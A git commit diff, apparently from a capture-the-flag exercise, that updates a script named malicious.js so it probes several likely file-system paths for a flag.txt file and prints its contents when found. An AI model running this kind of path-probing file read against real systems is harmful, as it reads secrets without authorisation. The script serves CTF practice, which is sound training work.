6ba5305a36a0ac60603a5e46225cc20687a09710
Marcia Oliveira <99289503+MarciaGabrielle@users.noreply.github.com>
2024-09-15 12:22:08 -0400

    Update malicious.js

--- malicious.js
+++ malicious.js
@@ -1,3 +1,20 @@
 const fs = require('fs');
-const flag = fs.readFileSync('./public/flag.txt', 'utf8');
-console.log(flag);
+const possiblePaths = [
+    './flag.txt',
+    './public/flag.txt',
+    '/flag.txt',
+    '/app/flag.txt',
+    '/app/public/flag.txt'
+];
+
+for (let path of possiblePaths) {
+    try {
+        if (fs.existsSync(path)) {
+            const flag = fs.readFileSync(path, 'utf8');
+            console.log(`Flag found at ${path}: ${flag}`);
+            break;
+        }
+    } catch (err) {
+        console.log(`Could not read file at ${path}: ${err}`);
+    }
+}
